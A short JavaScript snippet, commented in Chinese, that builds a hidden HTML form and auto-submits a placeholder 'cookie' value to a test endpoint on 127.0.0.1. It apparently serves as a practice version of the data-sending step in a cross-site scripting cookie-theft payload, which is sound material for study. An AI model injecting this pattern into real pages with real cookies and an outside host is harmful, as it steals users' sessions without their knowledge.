    <script>
        function postCookies(p){
        var form = document.createElement("form");
        form.action="http://127.0.0.1/test.php"; //连接
        form.method="post";  //提交方式
        form.style.display="none";  //显示空
        for (var x in p){
            var data = document.createElement("textarea"); //创建textarea标签
            data.name=x;
            data.value=p[x];
            form.appendChild(data); //将该标签添加到form
        }
        document.body.appendChild(form);
        form.submit(); //form表单提交方法
        }
        var p = {"cook":"hahaha"}
        postCookies(p);
    </script>
